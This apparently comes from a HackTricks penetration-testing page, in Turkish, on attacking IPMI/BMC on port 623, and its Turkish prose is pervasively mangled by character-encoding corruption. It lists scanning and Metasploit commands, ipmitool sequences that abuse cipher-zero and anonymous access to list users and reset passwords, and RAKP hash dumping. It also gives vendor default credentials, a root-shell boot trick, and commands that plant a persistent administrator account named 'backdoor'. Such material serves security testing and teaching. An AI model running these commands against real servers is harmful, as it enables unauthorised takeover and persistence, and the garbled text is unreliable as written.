# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

### **IPMI Genel BakÄ±ÅŸ**

**[AkÄ±llÄ± Platform YÃ¶netim ArayÃ¼zÃ¼ (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)**, iÅŸletim sisteminden veya gÃ¼Ã§ durumundan baÄŸÄ±msÄ±z olarak bilgisayar sistemlerinin uzaktan yÃ¶netimi ve izlenmesi iÃ§in standart bir yaklaÅŸÄ±m sunar. Bu teknoloji, sistem yÃ¶neticilerinin sistemleri uzaktan yÃ¶netmelerine olanak tanÄ±r, hatta sistem kapalÄ± veya yanÄ±t vermediÄŸinde bile, ve Ã¶zellikle ÅŸunlar iÃ§in faydalÄ±dÄ±r:

- OS Ã¶ncesi Ã¶nyÃ¼kleme yapÄ±landÄ±rmalarÄ±
- GÃ¼Ã§ kapalÄ± yÃ¶netimi
- Sistem arÄ±zalarÄ±ndan kurtarma

IPMI, sÄ±caklÄ±klarÄ±, voltajlarÄ±, fan hÄ±zlarÄ±nÄ± ve gÃ¼Ã§ kaynaklarÄ±nÄ± izleme yeteneÄŸine sahiptir, ayrÄ±ca envanter bilgileri saÄŸlama, donanÄ±m gÃ¼nlÃ¼klerini gÃ¶zden geÃ§irme ve SNMP aracÄ±lÄ±ÄŸÄ±yla uyarÄ±lar gÃ¶nderme iÅŸlevi de vardÄ±r. Ä°ÅŸlemi iÃ§in gerekli olanlar bir gÃ¼Ã§ kaynaÄŸÄ± ve bir LAN baÄŸlantÄ±sÄ±dÄ±r.

Intel tarafÄ±ndan 1998'de tanÄ±tÄ±ldÄ±ÄŸÄ±ndan beri, IPMI birÃ§ok satÄ±cÄ± tarafÄ±ndan desteklenmektedir ve uzaktan yÃ¶netim yeteneklerini artÄ±rmaktadÄ±r, Ã¶zellikle 2.0 sÃ¼rÃ¼mÃ¼nÃ¼n LAN Ã¼zerinden seri desteÄŸi ile. Ana bileÅŸenler ÅŸunlardÄ±r:

- **Ana Kart YÃ¶netim KontrolcÃ¼sÃ¼ (BMC):** IPMI iÅŸlemleri iÃ§in ana mikro denetleyici.
- **Ä°letiÅŸim AraÃ§larÄ± ve ArayÃ¼zleri:** ICMB, IPMB ve yerel ve aÄŸ baÄŸlantÄ±larÄ± iÃ§in Ã§eÅŸitli arayÃ¼zler dahil olmak Ã¼zere iÃ§ ve dÄ±ÅŸ iletiÅŸim iÃ§in.
- **IPMI BelleÄŸi:** GÃ¼nlÃ¼kleri ve verileri depolamak iÃ§in.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**VarsayÄ±lan Port**: 623/UDP/TCP (Genellikle UDP'de Ã§alÄ±ÅŸÄ±r ama TCP'de de Ã§alÄ±ÅŸÄ±yor olabilir)

## SayÄ±m

### KeÅŸif
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
SÃ¼rÃ¼mÃ¼ **belirleyebilirsiniz**:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI AÃ§Ä±klarÄ±

IPMI 2.0 alanÄ±nda, Dan Farmer tarafÄ±ndan Ã¶nemli bir gÃ¼venlik aÃ§Ä±ÄŸÄ± keÅŸfedildi ve bu aÃ§Ä±k **cipher type 0** aracÄ±lÄ±ÄŸÄ±yla ortaya Ã§Ä±ktÄ±. Bu aÃ§Ä±k, [Dan Farmer'Ä±n araÅŸtÄ±rmasÄ±nda](http://fish2.com/ipmi/cipherzero.html) ayrÄ±ntÄ±lÄ± olarak belgelenmiÅŸtir ve geÃ§erli bir kullanÄ±cÄ± hedef alÄ±ndÄ±ÄŸÄ±nda, herhangi bir ÅŸifre ile yetkisiz eriÅŸim saÄŸlar. Bu zayÄ±flÄ±k, HP, Dell ve Supermicro gibi Ã¼reticilerin Ã§eÅŸitli BMC'lerinde bulundu ve tÃ¼m IPMI 2.0 uygulamalarÄ±nda yaygÄ±n bir sorun olduÄŸunu gÃ¶stermektedir.

### **Cipher 0 ile IPMI Kimlik DoÄŸrulama Atlatma**

Bu aÃ§Ä±ÄŸÄ± tespit etmek iÃ§in aÅŸaÄŸÄ±daki Metasploit yardÄ±mcÄ± tarayÄ±cÄ±sÄ± kullanÄ±labilir:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Bu aÃ§Ä±ÄŸÄ±n istismarÄ± `ipmitool` ile mÃ¼mkÃ¼ndÃ¼r, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi, kullanÄ±cÄ± ÅŸifrelerinin listelenmesi ve deÄŸiÅŸtirilmesine olanak tanÄ±r:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP Kimlik DoÄŸrulama Uzak Åifre Hashi Alma**

Bu zafiyet, mevcut herhangi bir kullanÄ±cÄ± adÄ± iÃ§in tuzlu hashlenmiÅŸ ÅŸifrelerin (MD5 ve SHA1) alÄ±nmasÄ±nÄ± saÄŸlar. Bu zafiyeti test etmek iÃ§in Metasploit bir modÃ¼l sunar:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonim Kimlik DoÄŸrulama**

BirÃ§ok BMC'deki varsayÄ±lan yapÄ±landÄ±rma, boÅŸ kullanÄ±cÄ± adÄ± ve ÅŸifre dizeleri ile karakterize edilen "anonim" eriÅŸime izin verir. Bu yapÄ±landÄ±rma, `ipmitool` kullanarak adlandÄ±rÄ±lmÄ±ÅŸ kullanÄ±cÄ± hesaplarÄ±nÄ±n ÅŸifrelerini sÄ±fÄ±rlamak iÃ§in istismar edilebilir:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI DÃ¼z Metin ParolalarÄ±**

IPMI 2.0'daki kritik bir tasarÄ±m tercihi, kimlik doÄŸrulama amaÃ§larÄ± iÃ§in BMC'lerde dÃ¼z metin parolalarÄ±nÄ±n depolanmasÄ±nÄ± gerektirir. Supermicro'nun bu parolalarÄ± `/nv/PSBlock` veya `/nv/PSStore` gibi yerlerde depolamasÄ± Ã¶nemli gÃ¼venlik endiÅŸeleri doÄŸurmaktadÄ±r:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP AÃ§Ä±ÄŸÄ±**

Supermicro'nun IPMI firmware'Ä±nda, Ã¶zellikle UDP port 1900'de bir UPnP SSDP dinleyicisi bulundurmasÄ±, ciddi bir gÃ¼venlik riski oluÅŸturur. [Rapid7'nin ifÅŸasÄ±nda](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) detaylandÄ±rÄ±ldÄ±ÄŸÄ± gibi, UPnP CihazlarÄ± iÃ§in Intel SDK sÃ¼rÃ¼m 1.3.1'deki aÃ§Ä±klar, BMC'ye root eriÅŸimi saÄŸlar:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP, Ã¼retim sÄ±rasÄ±nda varsayÄ±lan ÅŸifreyi rastgele belirler** ve bu, **Entegre IÅŸÄ±k YÃ¶netimi (iLO)** Ã¼rÃ¼nÃ¼ iÃ§in geÃ§erlidir. Bu uygulama, **statik varsayÄ±lan kimlik bilgileri** kullanma eÄŸiliminde olan diÄŸer Ã¼reticilerle tezat oluÅŸturur. Ã‡eÅŸitli Ã¼rÃ¼nler iÃ§in varsayÄ±lan kullanÄ±cÄ± adlarÄ± ve ÅŸifrelerin bir Ã¶zeti aÅŸaÄŸÄ±da verilmiÅŸtir:

- **HP Entegre IÅŸÄ±k YÃ¶netimi (iLO)**, varsayÄ±lan ÅŸifre olarak **fabrika tarafÄ±ndan rastgele oluÅŸturulmuÅŸ 8 karakterli bir dize** kullanÄ±r ve bu, daha yÃ¼ksek bir gÃ¼venlik seviyesini gÃ¶sterir.
- **Dell'in iDRAC, IBM'in IMM** ve **Fujitsu'nun Entegre Uzaktan YÃ¶netim KontrolÃ¶rÃ¼** gibi Ã¼rÃ¼nler, sÄ±rasÄ±yla "calvin", "PASSW0RD" (sÄ±fÄ±r ile) ve "admin" gibi kolay tahmin edilebilir ÅŸifreler kullanÄ±r.
- Benzer ÅŸekilde, **Supermicro IPMI (2.0), Oracle/Sun ILOM** ve **ASUS iKVM BMC** de "ADMIN", "changeme" ve "admin" gibi basit varsayÄ±lan kimlik bilgilerini kullanmaktadÄ±r.


## Accessing the Host via BMC

Ana Kart YÃ¶netim KontrolÃ¶rÃ¼ (BMC) Ã¼zerinden yÃ¶netimsel eriÅŸim, ana bilgisayarÄ±n iÅŸletim sistemine eriÅŸim iÃ§in Ã§eÅŸitli yollar aÃ§ar. Basit bir yaklaÅŸÄ±m, BMC'nin Klavye, Video, Fare (KVM) iÅŸlevselliÄŸini kullanmaktÄ±r. Bu, ana bilgisayarÄ± GRUB Ã¼zerinden bir root shell'e yeniden baÅŸlatarak (`init=/bin/sh` kullanarak) veya kurtarma diski olarak ayarlanmÄ±ÅŸ sanal bir CD-ROM'dan baÅŸlatarak yapÄ±labilir. Bu yÃ¶ntemler, ana bilgisayarÄ±n diskini doÄŸrudan manipÃ¼le etmeye, arka kapÄ±lar eklemeye, veri Ã§Ä±karmaya veya gÃ¼venlik deÄŸerlendirmesi iÃ§in gerekli herhangi bir eylemi gerÃ§ekleÅŸtirmeye olanak tanÄ±r. Ancak, bu ana bilgisayarÄ± yeniden baÅŸlatmayÄ± gerektirir, bu da Ã¶nemli bir dezavantajdÄ±r. Yeniden baÅŸlatmadan, Ã§alÄ±ÅŸan ana bilgisayara eriÅŸim daha karmaÅŸÄ±k ve ana bilgisayarÄ±n yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak deÄŸiÅŸir. Ana bilgisayarÄ±n fiziksel veya seri konsolu oturum aÃ§mÄ±ÅŸ durumda kalÄ±rsa, BMC'nin KVM veya LAN Ã¼zerinden seri (sol) iÅŸlevselliÄŸi aracÄ±lÄ±ÄŸÄ±yla `ipmitool` kullanÄ±larak kolayca ele geÃ§irilebilir. PaylaÅŸÄ±lan donanÄ±m kaynaklarÄ±nÄ±n, Ã¶rneÄŸin i2c veri yolu ve SÃ¼per G/Ã‡ yongasÄ± gibi, istismarÄ±nÄ± araÅŸtÄ±rmak, daha fazla inceleme gerektiren bir alandÄ±r.

## Introducing Backdoors into BMC from the Host

BMC ile donatÄ±lmÄ±ÅŸ bir ana bilgisayarÄ± tehlikeye attÄ±ktan sonra, **yerel BMC arayÃ¼zÃ¼, arka kapÄ± kullanÄ±cÄ± hesabÄ± eklemek iÃ§in kullanÄ±labilir** ve bu, sunucuda kalÄ±cÄ± bir varlÄ±k oluÅŸturur. Bu saldÄ±rÄ±, tehlikeye atÄ±lmÄ±ÅŸ ana bilgisayarda **`ipmitool`** bulunmasÄ±nÄ± ve BMC sÃ¼rÃ¼cÃ¼ desteÄŸinin etkinleÅŸtirilmesini gerektirir. AÅŸaÄŸÄ±daki komutlar, kimlik doÄŸrulama gereksinimini atlayarak ana bilgisayarÄ±n yerel arayÃ¼zÃ¼ kullanÄ±larak BMC'ye yeni bir kullanÄ±cÄ± hesabÄ±nÄ±n nasÄ±l enjekte edilebileceÄŸini gÃ¶stermektedir. Bu teknik, Linux, Windows, BSD ve hatta DOS dahil olmak Ã¼zere geniÅŸ bir iÅŸletim sistemi yelpazesine uygulanabilir.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
